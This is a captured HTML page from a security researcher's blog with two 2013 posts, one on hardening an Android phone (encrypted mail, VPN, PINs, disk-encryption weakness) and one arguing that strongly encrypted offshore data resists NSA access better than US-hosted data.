+<p><strong><a href="https://play.google.com/store/apps/details?id=com.kaitenmail&amp;hl=en">Kaiten Mail</a> &amp; <a href="https://play.google.com/store/apps/details?id=org.thialfihar.android.apg&amp;hl=en">AGP</a></strong> - Kaiten is a low cost ($4.99) mail client; though if you want to go cheaper, it&#8217;s open-source cousin <a href="https://play.google.com/store/apps/details?id=com.fsck.k9&amp;hl=en">K-9 Mail</a> is free. They are developed by the same core team, though Kaiten seems to get the new features first, then they are ported into K-9. I like supporting OSS developers, so I happily went with the paid version. It works great with my Google Apps email account, though does take some getting used to.</p>
+
+<p>Where it really comes in handy though, is when you use it with AGP, the Android Privacy Guard. It&#8217;s a simple, minimalistic OpenPGP tool that integrates nicely with Kaiten and K-9. It makes it simple to support encrypted or signed mail on your phone.</p>
+
+<p>This does though require that your private key be on the device, so keep that risk in mind.</p>
+
+<p>AGP is a bit dated, and hasn&#8217;t been updated since 2010. So, it&#8217;s  clearly been abandoned. Thankfully though, <a href="http://sufficientlysecure.org/">Dominik Schürmann</a> has <a href="https://github.com/dschuermann/openpgp-keychain">forked the project</a> and is working on a major update (new GUI, new API, etc.) that should be ready early next year.</p>
+
+<p><strong><a href="https://play.google.com/store/apps/details?id=com.gmail.mjm4456.vpncilla&amp;hl=en">VpnCilla</a></strong> - Next up is a highly configurable VPN client ($4.99). WIFI is great - except that evil part of your traffic being so simple to monitor, and with recent work on <a href="http://www.theregister.co.uk/2013/07/15/femtocell_flaw_leaves_verizon_customers_wifi_and_mobile_wide_open/">femtocell systems</a>, even 3G/4G connections can&#8217;t be fully trusted. Having a VPN handy is a must.</p>
+
+<p>You&#8217;ll also need a good VPN service; my current pick is <a href="http://www.atenlabs.com/zipline/">zipline</a>; it&#8217;s fast, cheap, and from a trusted professional (<a href="https://twitter.com/viss">Dan Tentler</a>).</p>
+
+<p><strong><a href="https://play.google.com/store/apps/details?id=org.thoughtcrime.redphone&amp;hl=en">RedPhone</a></strong> - Another tool from Moxie, RedPhone secures your voice communications via encrypted VoIP. Or at least so I&#8217;ve read - I never actually make voice calls on my personal phone anymore.</p>
+
+<p><strong>Others</strong> - There are various other useful things - Google Authenticator (2FA all the things, right?), ConnectBot to SSH into your server to do anything you don&#8217;t want to do from your phone, use wifitrack &amp; Wifi Analyzer to better understand what&#8217;s in your area.</p>
+
+<p><strong>Configuration</strong></p>
+
+<p>There is, of course, obvious configuration to make things a bit safer. Make sure you have a good password, or at least a long PIN set - don&#8217;t trust patterns, and don&#8217;t bother with a 4 digit PIN.</p>
+
+<p>USB debugging <em>must</em> be turned off - otherwise there&#8217;s no point in locking your phone. Some other settings help, but not enough - one big one is Android&#8217;s full disk encryption.</p>
+
+<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p>Hashkill now cracks Android FDE images master password. Speed is ~135k on 6870, ~270k/s on 7970. Android FDE is weak. <a href="http://t.co/mhcvEuEP48">pic.twitter.com/mhcvEuEP48</a></p>&mdash; gat3way (@gat3way) <a href="https://twitter.com/gat3way/statuses/328550698558029824">April 28, 2013</a></blockquote>
+<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></div>
+
+
+<p>If you only have a short numeric PIN, the FDE is little better than a wet paper bag.</p>
+
+<p><strong>Weak Spots</strong></p>
+
+<p>It&#8217;s not all great though, there are still weaknesses - plenty in fact. Thanks to USB MUXing there is probably a debug interface - and maybe even a full shell on your phone, and you have no way of turning it off. There may be flaws in the baseband or other software that could allow an attacker to gain control.</p>
+
+<p>The list goes on and on. And that&#8217;s without the fact that your phone company hands over all of your call records, or the various apps you need, but don&#8217;t have a secure replacement.</p>
+
+<p>There is no such thing as an NSA proof phone - unless you literally melt it. What we can do though is make it harder to be spied on; make the attackers work for every bit of data. Give nothing away for free.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2013/08/27/is-moving-offshore-really-crazy/">Is Moving Offshore Really Crazy?</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-08-27T18:49:00-04:00" pubdate data-updated="true">Aug 27<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Today ZDNet published an article titled &#8221;<a href="http://www.zdnet.com/the-lunacy-of-trying-to-avoid-nsa-spying-by-moving-e-mail-and-cloud-out-of-the-us-7000019908/">The lunacy of trying to avoid NSA spying by moving e-mail and cloud out of the US</a>&#8221; - I&#8217;m still trying to figure out if the position is naive, or intentionally ignores important facts.</p>
+
+<p>In short, the author (<a href="http://www.zdnet.com/meet-the-team/us/steven-j-vaughan-nichols/">Steven J. Vaughan-Nichols</a>) states that your data is safer in the US because outside of the US, the NSA has much less restrictive rules to operate under. This is actually true - the NSA is a spy agency; like most spy agencies, they spy on people.</p>
+
+<p>For those outside of the US, or those that routinely communicate  with those that are outside of the US - as far as the NSA goes, you are fair game. Anything and everything you do, if they can see it, they&#8217;ll use. So on that point, ZDNet was right.</p>
+
+<p>But their points only hold true if you ignore cryptography.</p>
+
+<p>When your data is outside the US, you have to rely on encryption to protect your data; inside the US you have to rely on <a href="https://epic.org/privacy/terrorism/fisa/fisc.html">FISC</a> to protect you. The <a href="http://arstechnica.com/tech-policy/2013/08/how-might-the-feds-have-snooped-on-lavabit/">Lavabit affair</a> (or Hushmail if you want another example) should make it clear that inside the US, encrypted data held by a third-party shouldn&#8217;t be seen as secure as it once was - for that matter, it probably shouldn&#8217;t be viewed as secure at all (if your adversary is the US Government; in which case, you don&#8217;t have much hope anyway).</p>
+
+<p>When somebody posted a link to the article, I made my point short and sweet:</p>
+
+<div class='embed tweet'><blockquote class="twitter-tweet" align="center" width="350"><p><a href="https://twitter.com/gattaca">@gattaca</a> It&#39;s a lot harder to break crypto than it is to order a provider to just hand over the data. With good crypto, offshore is safer.</p>&mdash; Adam Caudill (@adamcaudill) <a href="https://twitter.com/adamcaudill/statuses/372469441922998272">August 27, 2013</a></blockquote>
+<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></div>
+
+
+<p>It&#8217;s hard to break properly implemented, strong cryptography - on the other hand, getting FISC to order a provider to hand over your data seems to be <a href="https://www.eff.org/deeplinks/2013/08/nsa-spying-three-pillars-government-trust-have-fallen">quite simple</a>. Given the choice of relying on encryption or a rubber-stamp court to protect my data - the right choice seems obvious.</p>
+
+<p>Now, in all fairness, it&#8217;s worth noting that the NSA likes to collect and examine encrypted communication more than other things - and the odds of your data passing through the NSA is certainly higher if your data is offshore. If properly encrypted though, the odds of them seeing the content is reduced.</p>
+
+<p>So is it insane to move data offshore to avoid the NSA? If you want them to not see anything you do, then yes, yes it is. If you want to reduce the odds of them seeing the content - it&#8217;s actually a reasonably prudent move.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/page/5/">&larr; Older</a>
+    
+    <a href="/archives/">Blog Archives</a>
+    
+    <a class="next" href="/page/3/">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>About Me</h1>
+  <p><img src="https://1.gravatar.com/avatar/49e14cf9f67c48aad082dec4f106f19a?size=250" class="aligncenter"></p>
+  <p>I am an independant security researcher and software developer with more than 15 years of experience. I primarily focus on application security, secure communications, and cryptography, though often research new areas if I get too bored. I write about my research and security in general, development and software design, and whatever hobby has my attention at the moment.</p>
+  <p>Email: <a href="mailto:adam@adamcaudill.com">adam@adamcaudill.com</a> (<a href="https://adamcaudill.com/pgp/">PGP</a>)</p>
+</section>
+<section>
+  <h1>Links</h1>
+	<ul>
+		<li><a href="https://twitter.com/adamcaudill">Twitter</a></li>
+		<li><a href="http://www.linkedin.com/in/adamcaudill">LinkedIn</a></li>
+		<li><a href="https://github.com/adamcaudill">GitHub</a></li>
+		<li><a href="http://www.flickr.com/people/adamcaudill/">Flickr</a></li>
+	</ul>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/2014/12/03/orwellian-justice/">Orwellian Justice</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014/11/23/speaking-at-sc-magazine-congress/">Speaking at SC Magazine Congress</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014/10/19/on-nsa-proof-security/">On NSA-Proof Security</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014/10/17/a-backdoor-by-any-other-name/">A backdoor by any other name&#8230;</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014/10/03/on-the-ethics-of-badusb/">On The Ethics of BadUSB</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating&#8230;</li>
+  </ul>
+  
+  <a href="https://github.com/adamcaudill">@adamcaudill</a> on GitHub
+  
+  <script type="text/javascript">
+    $.domReady(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'adamcaudill',
+            count: 4,
+            skip_forks: false,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Enjoy this site? Consider donating via Bitcoin to <strong>14jumFDmuVkLiAt4TgyKt17SWHtPRbkcLr</strong>.<br>
+  Copyright &copy; 2014 - Adam Caudill -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'https://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
